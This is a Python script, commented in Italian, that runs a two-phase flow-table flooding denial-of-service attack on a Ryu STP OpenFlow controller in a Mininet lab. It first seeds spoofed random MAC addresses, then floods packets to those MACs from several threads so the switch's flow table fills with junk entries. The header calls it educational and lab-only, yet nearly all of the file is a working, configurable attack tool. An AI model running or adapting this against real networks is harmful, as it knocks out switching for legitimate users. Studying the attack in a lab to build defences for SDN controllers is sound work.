from typing import List

"""
╔══════════════════════════════════════════════════════════════════╗
║        Flow Table Flooding Attack v2 - Scopo Didattico           ║
║  Switch compromesso: s2  |  Controller: Ryu STP (porta 6653)     ║
╚══════════════════════════════════════════════════════════════════╝

PROBLEMA CON LA VERSIONE PRECEDENTE:
  Il controller Ryu STP installa flow entries SOLO quando conosce
  la porta di uscita verso la destinazione:

      if out_port != ofproto.OFPP_FLOOD:          # <-- condizione chiave
          match = OFPMatch(in_port=in_port, eth_dst=dst)
          self.add_flow(datapath, 1, match, actions)

  Se il controller non ha ancora imparato dove si trova la dst,
  risponde con FLOOD ma NON installa nessuna regola → la flow
  table rimane vuota indipendentemente da quanti pacchetti si inviano.

SOLUZIONE - ATTACCO IN DUE FASI:

  FASE 1 – "Seed": invia pacchetti con MAC sorgente casuali
  come se provenissero da host reali. Il controller impara
  mac_to_port[dpid][random_src] = in_port per ogni flusso.

  FASE 2 – "Harvest": ora invia pacchetti con:
    - dst = uno dei MAC casuali appresi nella fase 1
    - src = qualsiasi MAC
  Il controller trova dst in mac_to_port → installa la flow entry!
  Ripetendo con migliaia di dst diversi, la TCAM si esaurisce.

  ┌──────────────────────────────────────────────────────────────┐
  │  Risultato: ogni pacchetto della fase 2 genera:              │
  │   • Packet-In verso il controller (CPU saturation)           │
  │   • add_flow(match=eth_dst=<random_mac>) su s2               │
  │   → La flow table si riempie con regole spazzatura           │
  └──────────────────────────────────────────────────────────────┘

TOPOLOGIA:
    h1, h2 --- s1 --- s2 --- s3 --- h3, h4
                 \\         /
                  \\_______/  (link diretto s1-s3, STP gestisce loop)

USO:
  # Dalla Mininet CLI su h1 (collegato a s2 via s1):
  #   mininet> h1 python3 flow_table_flood_v2.py --iface h1-eth0

  # Direttamente su interfaccia di s2:
  #   sudo python3 flow_table_flood_v2.py --iface s2-eth1 --seed 500 --count 50000

DIPENDENZE:
    pip install scapy
"""

import argparse
import random
import time
import sys
import signal
from threading import Thread, Event

try:
    from scapy.all import (
        Ether, IP, TCP, UDP, ICMP,
        sendp, conf, get_if_list
    )
except ImportError:
    print("[!] Scapy non trovato. Installa con: pip install scapy")
    sys.exit(1)

# ─── Statistiche globali ───────────────────────────────────────────────────────
stats = {
    "sent": 0,
    "errors": 0,
    "flow_entries_estimated": 0,
    "start_time": None,
    "phase": "IDLE",
}
stop_event = Event()

# Pool di MAC "seminati" nella fase 1: il controller li associa a porte reali.
# Nella fase 2 li usiamo come destinazioni → il controller installa flow entries.
seeded_macs = []


# ─── Generatori casuali ────────────────────────────────────────────────────────
def random_mac() -> str:
    """Genera un MAC address casuale (unicast, non multicast)."""
    octets = [random.randint(0x00, 0xFE) for _ in range(6)]
    octets[0] &= 0xFE  # bit LSB = 0 → unicast
    return ":".join(f"{o:02x}" for o in octets)


def random_ip(subnet: str = "10.0.0") -> str:
    """Genera un IP casuale nel subnet specificato (evita .0 e .255)."""
    return f"{subnet}.{random.randint(1, 254)}"


def random_port() -> int:
    return random.randint(1024, 65535)


# ─── Costruzione pacchetti ─────────────────────────────────────────────────────
def build_packet(src_mac: str, dst_mac: str,
                 src_ip: str, dst_ip: str,
                 proto: str = "tcp") -> Ether:
    """Costruisce un pacchetto Layer 2/3 con parametri arbitrari."""
    eth = Ether(src=src_mac, dst=dst_mac)
    ip  = IP(src=src_ip, dst=dst_ip, ttl=64)

    if proto == "tcp":
        transport = TCP(sport=random_port(), dport=random_port(), flags="S")
    elif proto == "udp":
        transport = UDP(sport=random_port(), dport=random_port())
    else:
        transport = ICMP()

    return eth / ip / transport


# ─── FASE 1: Seeding ───────────────────────────────────────────────────────────
def phase1_seed(iface: str, seed_count: int, proto: str) -> List[str]:
    """
    Invia `seed_count` pacchetti con MAC sorgente casuali.
    Ogni pacchetto insegna al controller:
        mac_to_port[dpid][random_src_mac] = in_port
    Ritorna la lista dei MAC sorgente usati (il "pool" per la fase 2).
    """
    print(f"\n[FASE 1] Seeding: invio {seed_count} pacchetti con MAC src casuali...")
    print(f"         Obiettivo: far imparare al controller i MAC sorgente casuali.")
    macs = []
    pkts = []
    for _ in range(seed_count):
        src = random_mac()
        macs.append(src)
        pkt = build_packet(
            src_mac=src,
            dst_mac="ff:ff:ff:ff:ff:ff",   # broadcast → il controller lo floodda
            src_ip=random_ip(),
            dst_ip="10.0.0.255",
            proto=proto,
        )
        pkts.append(pkt)

    # Invio in burst da 200
    burst = 200
    sent = 0
    for i in range(0, len(pkts), burst):
        if stop_event.is_set():
            break
        chunk = pkts[i:i + burst]
        try:
            sendp(chunk, iface=iface, verbose=False)
            sent += len(chunk)
            stats["sent"] += len(chunk)
        except Exception as e:
            stats["errors"] += 1
            print(f"[!] Errore fase 1: {e}")
        # Piccola pausa: dà tempo al controller di processare i Packet-In
        time.sleep(0.05)

    print(f"[FASE 1] Completato. Inviati {sent} pacchetti seed.")
    print(f"         Il controller ora conosce ~{len(macs)} MAC casuali.")
    # Attendi che il controller abbia processato tutti i Packet-In
    print("[FASE 1] Attendo 2s per permettere al controller di aggiornare mac_to_port...")
    time.sleep(2)
    return macs


# ─── FASE 2: Flooding con destinazioni note ────────────────────────────────────
def flood_worker(iface: str, dst_macs: List[str],
                 proto: str, burst: int, delay: float):
    """
    Worker thread per la fase 2.
    Invia pacchetti verso MAC di destinazione presenti nel pool seed.
    Poiché il controller conosce quei MAC → installa flow entry su s2.

    Match installato dal controller:
        OFPMatch(in_port=X, eth_dst=<seeded_mac>)  priority=1
    → Ogni MAC seed genera UNA nuova entry nella flow table di s2.
    """
    local_pool = dst_macs.copy()
    random.shuffle(local_pool)
    pool_size = len(local_pool)
    idx = 0

    while not stop_event.is_set():
        pkts = []
        for _ in range(burst):
            dst = local_pool[idx % pool_size]
            idx += 1
            pkt = build_packet(
                src_mac=random_mac(),   # src sempre casuale
                dst_mac=dst,            # dst = MAC seminato in fase 1
                src_ip=random_ip(),
                dst_ip=random_ip(),
                proto=proto,
            )
            pkts.append(pkt)

        try:
            sendp(pkts, iface=iface, verbose=False)
            stats["sent"] += burst
            # Stima entry installate: ogni dst unico genera 1 entry
            # (in realtà dipende da in_port × eth_dst)
            stats["flow_entries_estimated"] = min(idx, pool_size)
        except Exception as e:
            stats["errors"] += 1
            if stats["errors"] < 5:
                print(f"\n[!] Errore invio: {e}")
        if delay > 0:
            time.sleep(delay)


# ─── FASE 2 AVANZATA: espansione del pool ──────────────────────────────────────
def pool_expander(iface: str, proto: str, extra_batch: int, interval: float):
    """
    Thread opzionale: ogni `interval` secondi invia un nuovo batch seed
    per espandere il pool di MAC noti al controller, poi li aggiunge
    al pool globale dei flood worker.
    """
    while not stop_event.is_set():
        time.sleep(interval)
        if stop_event.is_set():
            break
        new_macs = phase1_seed(iface, extra_batch, proto)
        seeded_macs.extend(new_macs)
        print(f"\n[EXPANDER] Pool espanso a {len(seeded_macs)} MAC.")


# ─── Thread di monitor ─────────────────────────────────────────────────────────
def monitor_worker(interval: float = 1.5):
    """Stampa statistiche in tempo reale."""
    while not stop_event.is_set():
        elapsed = time.time() - stats["start_time"]
        rate    = stats["sent"] / elapsed if elapsed > 0 else 0
        print(
            f"\r[{stats['phase']:^8}] "
            f"Inviati: {stats['sent']:>8,}  |  "
            f"Rate: {rate:>7,.0f} pkt/s  |  "
            f"Flow entries ~{stats['flow_entries_estimated']:>6,}  |  "
            f"Errori: {stats['errors']:>3}  |  "
            f"{elapsed:>5.1f}s",
            end="", flush=True
        )
        time.sleep(interval)


# ─── Handler SIGINT ────────────────────────────────────────────────────────────
def handle_sigint(sig, frame):
    print("\n\n[!] Interruzione ricevuta (CTRL+C). Arresto in corso...")
    stop_event.set()


# ─── Main ──────────────────────────────────────────────────────────────────────
def main():
    parser = argparse.ArgumentParser(
        description="Flow Table Flooding v2 – attacco bifase su Ryu STP (solo laboratorio)"
    )
    parser.add_argument(
        "--iface", required=True,
        help="Interfaccia verso s2 (es: h1-eth0, s2-eth1)"
    )
    parser.add_argument(
        "--seed", type=int, default=300,
        help="MAC da seminare in fase 1 (default: 300). "
             "Aumentare per riempire più velocemente la flow table."
    )
    parser.add_argument(
        "--proto", choices=["tcp", "udp", "icmp"], default="tcp",
        help="Protocollo trasporto (default: tcp)"
    )
    parser.add_argument(
        "--threads", type=int, default=4,
        help="Thread di flooding in fase 2 (default: 4)"
    )
    parser.add_argument(
        "--burst", type=int, default=100,
        help="Pacchetti per burst per thread (default: 100)"
    )
    parser.add_argument(
        "--delay", type=float, default=0.0,
        help="Pausa tra burst in secondi (default: 0)"
    )
    parser.add_argument(
        "--count", type=int, default=0,
        help="Ferma dopo N pacchetti totali, 0=infinito (default: 0)"
    )
    parser.add_argument(
        "--expand-pool", action="store_true",
        help="Espandi il pool seed periodicamente durante il flooding"
    )
    parser.add_argument(
        "--expand-interval", type=float, default=10.0,
        help="Secondi tra ogni espansione del pool (default: 10)"
    )
    parser.add_argument(
        "--expand-batch", type=int, default=200,
        help="MAC aggiuntivi per ogni espansione (default: 200)"
    )
    parser.add_argument(
        "--show-ifaces", action="store_true",
        help="Mostra interfacce disponibili ed esci"
    )

    args = parser.parse_args()

    if args.show_ifaces:
        print("[*] Interfacce disponibili:")
        for iface in get_if_list():
            print(f"    {iface}")
        sys.exit(0)

    if args.iface not in get_if_list():
        print(f"[!] Interfaccia '{args.iface}' non trovata.")
        print("    Usa --show-ifaces per vedere quelle disponibili.")
        sys.exit(1)

    # ── Banner ─────────────────────────────────────────────────────────────────
    print("=" * 70)
    print("  FLOW TABLE FLOODING ATTACK v2  |  Solo per uso in laboratorio")
    print("=" * 70)
    print(f"  Interfaccia  : {args.iface}")
    print(f"  Protocollo   : {args.proto.upper()}")
    print(f"  Seed fase 1  : {args.seed} MAC")
    print(f"  Thread fase 2: {args.threads}")
    print(f"  Burst/thread : {args.burst} pkt")
    print(f"  Limite totale: {'∞' if args.count == 0 else args.count} pkt")
    print("=" * 70)
    print("  Meccanismo d'attacco (BIFASE):")
    print("  FASE 1 – SEED:")
    print("    • Invia pkt con MAC src casuali (dst=broadcast)")
    print("    • Il controller impara: mac_to_port[s2][rand_MAC] = in_port")
    print("  FASE 2 – FLOOD:")
    print("    • Invia pkt con dst=MAC seminati in fase 1")
    print("    • Il controller trova dst in mac_to_port → installa flow entry")
    print("    • match: OFPMatch(in_port=X, eth_dst=<rand_MAC>)  priority=1")
    print("    • La TCAM di s2 si esaurisce → degrado / drop pacchetti legittimi")
    print("=" * 70)
    print("  Premi CTRL+C per fermare.\n")

    signal.signal(signal.SIGINT, handle_sigint)
    conf.verb = 0
    stats["start_time"] = time.time()

    # ── FASE 1: Seeding ────────────────────────────────────────────────────────
    stats["phase"] = "SEED"
    global seeded_macs
    seeded_macs = phase1_seed(args.iface, args.seed, args.proto)

    if stop_event.is_set():
        sys.exit(0)

    if len(seeded_macs) == 0:
        print("[!] Nessun MAC seminato. Controlla l'interfaccia e riprova.")
        sys.exit(1)

    # ── FASE 2: Flooding ───────────────────────────────────────────────────────
    stats["phase"] = "FLOOD"
    print(f"\n[FASE 2] Avvio flooding verso {len(seeded_macs)} MAC destinazione noti...")
    print(f"         Il controller installerà fino a {len(seeded_macs)} flow entries su s2.\n")

    # Thread monitor
    mon = Thread(target=monitor_worker, args=(1.5,), daemon=True)
    mon.start()

    # Thread espansione pool (opzionale)
    if args.expand_pool:
        exp = Thread(
            target=pool_expander,
            args=(args.iface, args.proto, args.expand_batch, args.expand_interval),
            daemon=True,
        )
        exp.start()

    # Thread flooding
    workers = []
    for _ in range(args.threads):
        t = Thread(
            target=flood_worker,
            args=(args.iface, seeded_macs, args.proto, args.burst, args.delay),
            daemon=True,
        )
        t.start()
        workers.append(t)

    # Controllo limite
    try:
        while not stop_event.is_set():
            if args.count > 0 and stats["sent"] >= args.count:
                print(f"\n[+] Raggiunto il limite di {args.count} pacchetti.")
                stop_event.set()
            time.sleep(0.1)
    except KeyboardInterrupt:
        stop_event.set()

    for t in workers:
        t.join(timeout=2)

    # ── Report finale ──────────────────────────────────────────────────────────
    elapsed = time.time() - stats["start_time"]
    rate    = stats["sent"] / elapsed if elapsed > 0 else 0
    print("\n")
    print("=" * 70)
    print("  REPORT FINALE")
    print("=" * 70)
    print(f"  Pacchetti inviati         : {stats['sent']:,}")
    print(f"  Flow entries stimate      : ~{stats['flow_entries_estimated']:,}")
    print(f"  Errori                    : {stats['errors']}")
    print(f"  Durata                    : {elapsed:.2f}s")
    print(f"  Rate medio                : {rate:,.0f} pkt/s")
    print("=" * 70)
    print("  Per verificare l'effetto su s2:")
    print("    sudo ovs-ofctl dump-flows s2 | wc -l")
    print("    sudo ovs-ofctl dump-flows s2")
    print("    sudo ovs-appctl ofproto/show s2")
    print("  Per vedere i log del controller Ryu:")
    print("    (nella finestra dove gira ryu-manager) cercare righe 'packet in'")
    print("=" * 70)


if __name__ == "__main__":
    main()
